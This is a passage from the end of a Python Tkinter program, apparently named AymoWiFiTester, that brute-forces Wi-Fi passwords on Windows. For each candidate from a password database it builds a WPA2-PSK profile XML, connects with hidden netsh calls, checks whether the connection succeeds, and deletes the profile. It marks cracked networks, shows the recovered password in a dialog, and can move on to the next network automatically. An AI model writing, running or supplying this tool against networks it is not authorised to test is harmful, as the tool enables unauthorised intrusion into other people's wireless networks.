                            st = line.split(":", 1)[1].strip()
                    if cssid == ssid and st == "connected":
                        connected = True
                subprocess.run(["netsh", "wlan", "disconnect"],
                              capture_output=True, timeout=3, creationflags=CREATE_NO_WINDOW)
                subprocess.run(["netsh", "wlan", "delete", "profile",
                               f"name={ssid}"], capture_output=True,
                               timeout=3, creationflags=CREATE_NO_WINDOW)
                return connected
            finally:
                try:
                    os.unlink(xp)
                except:
                    pass
        except Exception as e:
            self._log(f"Error: {e}", "error")
        return False

    def _xml(self, ssid, pwd):
        def esc(t):
            r = []
            for ch in t:
                if ch == "&": r.append("&amp;")
                elif ch == "<": r.append("&lt;")
                elif ch == ">": r.append("&gt;")
                elif ch == '"': r.append("&quot;")
                elif ch == "'": r.append("&apos;")
                else: r.append(ch)
            return "".join(r)
        s = esc(ssid); p = esc(pwd)
        return "\n".join([
            '<?xml version="1.0"?>',
            '<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">',
            f"    <name>{s}</name>",
            '    <SSIDConfig><SSID><name>' + s + '</name></SSID></SSIDConfig>',
            '    <connectionType>ESS</connectionType>',
            '    <connectionMode>manual</connectionMode>',
            '    <MSM><security><authEncryption>',
            '        <authentication>WPA2PSK</authentication>',
            '        <encryption>AES</encryption>',
            '        <useOneX>false</useOneX>',
            '    </authEncryption><sharedKey>',
            '        <keyType>passPhrase</keyType>',
            '        <protected>false</protected>',
            f"        <keyMaterial>{p}</keyMaterial>",
            '    </sharedKey></security></MSM>',
            '</WLANProfile>'
        ])

    def _status(self, pw, idx, ssid):
        self.status_var.set(f"Trying {idx+1}/{len(self.password_db)}: {pw[:12]}... ({ssid})")
        self._log(f"#{idx+1}: {pw[:20]} for {ssid}", "info")

    def _found(self, ssid, pw, auto=False):
        self.testing = False
        self.test_btn.set_enabled(True)
        self.stop_btn.set_enabled(False)
        self.scan_btn.set_enabled(True)
        self.pulse.stop()
        self.status_var.set(f"✅ Found: {ssid}")
        self._log(f"SUCCESS! {ssid}: {pw}", "success")
        self._toast(f"Password found: {ssid}", "success", 4000)
        if ssid in self.network_items:
            item = self.network_items[ssid]
            v = self.tree.item(item)["values"]
            self.tree.item(item, values=(v[0], v[1], v[2], v[3], "✅ FOUND"))
        if auto:
            self.root.after(800, self._auto_next)
        else:
            self._dialog(ssid, pw)

    def _complete(self, ssid):
        self.testing = False
        self.test_btn.set_enabled(True)
        self.stop_btn.set_enabled(False)
        self.scan_btn.set_enabled(True)
        self.pulse.stop()
        self.status_var.set(f"No match for {ssid}")
        self._log(f"No match for {ssid}", "warning")
        self._toast(f"No match for {ssid}", "info")
        if ssid in self.network_items:
            item = self.network_items[ssid]
            v = self.tree.item(item)["values"]
            self.tree.item(item, values=(v[0], v[1], v[2], v[3], "❌ Failed"))

    def _dialog(self, ssid, pw):
        d = tk.Toplevel(self.root)
        d.title("Password Found!")
        d.geometry("360x240")
        d.configure(bg=C["bg"])
        d.transient(self.root)
        d.grab_set()
        d.update_idletasks()
        x = self.root.winfo_x() + self.root.winfo_width() // 2 - 180
        y = self.root.winfo_y() + self.root.winfo_height() // 2 - 120
        d.geometry(f"+{x}+{y}")

        card = tk.Frame(d, bg=C["card"], highlightbackground=C["border_focus"],
                       highlightthickness=1)
        card.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        ic = tk.Canvas(card, width=56, height=56, highlightthickness=0, bg=C["card"])
        ic.pack(pady=(0, 14))
        ic.create_oval(2, 2, 54, 54, fill=C["success"], outline="")
        ic.create_text(28, 28, text="✓", fill="#ffffff",
                      font=(C["font"], 22, "bold"))

        tk.Label(card, text="Password Found!", font=(C["font"], 14, "bold"),
                fg=C["text"], bg=C["card"]).pack(pady=(0, 6))
        tk.Label(card, text=f"Network: {ssid}", font=(C["font"], 10),
                fg=C["text_second"], bg=C["card"]).pack()
        tk.Label(card, text=f"Password: {pw}", font=(C["mono"], 10, "bold"),
                fg=C["success"], bg=C["card"]).pack(pady=(6, 0))

        ModernButton(card, "Close", command=d.destroy,
                    bg=C["orange"], width=120, height=34, radius=6, font_size=10).pack(pady=(16, 0))


def main():
    root = tk.Tk()
    root.update_idletasks()
    x = (root.winfo_screenwidth() // 2) - 550
    y = (root.winfo_screenheight() // 2) - 350
    root.geometry(f"1100x700+{x}+{y}")

    try:
        ico = Path(__file__).parent / "wifi_icon.ico"
        if ico.exists():
            root.iconbitmap(str(ico))
    except:
        pass

    AymoWiFiTester(root)
    root.mainloop()


if __name__ == "__main__":
    main()
